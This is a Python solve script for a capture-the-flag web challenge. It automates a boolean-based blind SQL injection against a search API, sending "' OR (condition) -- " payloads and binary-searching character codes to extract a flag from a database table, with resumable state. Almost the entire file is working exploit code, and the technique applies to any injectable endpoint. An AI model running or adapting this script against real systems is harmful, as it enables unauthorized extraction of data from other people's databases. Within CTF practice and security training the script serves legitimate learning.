#!/usr/bin/env python3
"""
Standard CTF Web Exploitation Solve Template (High-Speed Async)
Usage:
  python3 solve_web.py
"""

import sys
import json
import time
import asyncio
import httpx

# ==============================================================================
# CONFIGURATION
# ==============================================================================
TARGET_URL = "http://challenge.ctf:8080/api/v1/search"
CONCURRENCY = 10
STATE_FILE = "state.json"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (CTF-Solver/1.0)",
    "Content-Type": "application/json"
}

# ==============================================================================
# STATE MANAGEMENT & RESUME
# ==============================================================================
def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {"extracted": "", "index": 1}

def save_state(extracted, index):
    with open(STATE_FILE, "w") as f:
        json.dump({"extracted": extracted, "index": index}, f)

# ==============================================================================
# BLIND EXPLOIT ENGINE (BINARY SEARCH)
# ==============================================================================
async def check_condition(client: httpx.AsyncClient, condition: str) -> bool:
    """
    Sends payload to target and returns True/False based on response condition.
    """
    # Example SQLi payload:
    payload = f"' OR ({condition}) -- "
    try:
        r = await client.post(TARGET_URL, json={"query": payload}, headers=HEADERS, timeout=5.0)
        return "Found" in r.text
    except Exception as e:
        return False

async def extract_flag(max_len=40):
    state = load_state()
    extracted = state.get("extracted", "")
    start_idx = len(extracted) + 1

    print(f"[*] Resuming from index {start_idx}, current: '{extracted}'")

    async with httpx.AsyncClient(timeout=10.0) as client:
        for idx in range(start_idx, max_len + 1):
            low = 32
            high = 126
            found_char = False

            while low <= high:
                mid = (low + high) // 2
                # SQL Condition: ASCII value of char at idx > mid
                cond = f"ascii(substr((SELECT flag FROM flags LIMIT 1), {idx}, 1)) > {mid}"
                is_greater = await check_condition(client, cond)

                if is_greater:
                    low = mid + 1
                else:
                    high = mid - 1

            char = chr(low)
            extracted += char
            print(f"[+] Index {idx:02d} -> '{char}' | Extracted: {extracted}")
            save_state(extracted, idx)

            if char == "}":
                print(f"[✓] Flag completely captured: {extracted}")
                break

    return extracted

# ==============================================================================
# ENTRY POINT
# ==============================================================================
if __name__ == "__main__":
    asyncio.run(extract_flag())
